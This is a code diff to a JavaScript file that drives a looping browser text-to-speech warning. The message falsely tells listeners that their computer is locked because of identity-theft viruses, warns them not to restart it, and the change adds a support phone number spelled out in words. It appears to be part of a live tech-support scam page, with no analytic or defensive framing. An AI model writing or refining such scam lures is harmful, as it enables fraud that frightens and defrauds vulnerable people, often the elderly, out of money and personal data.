@@ -24,7 +24,9 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     function startVoiceLoop() {
-        const message = "Your computer has been locked out. Your IP address was used without your knowledge or concern to visit websites that contain identity theft viruses. To unlock the computer, please call support immediately. Please do not attempt to shut down or restart the computer. Doing that may lead to data loss and identity theft. The computer lock is aimed to stop illegal activity. Please call our support immediately.";
+        // UPDATED VOICE MESSAGE WITH THE NEW NUMBER
+        const message = "Your computer has been locked out. Your IP address was used without your knowledge or concern to visit websites that contain identity theft viruses. To unlock the computer, please call support immediately at plus one two five zero, eight zero zero, zero seven six seven. Please do not attempt to shut down or restart the computer. Doing that may lead to data loss and identity theft. The computer lock is aimed to stop illegal activity. Please call our support immediately.";
+        
         const utterance = new SpeechSynthesisUtterance(message);
         utterance.rate = 0.95;
         utterance.pitch = 1;
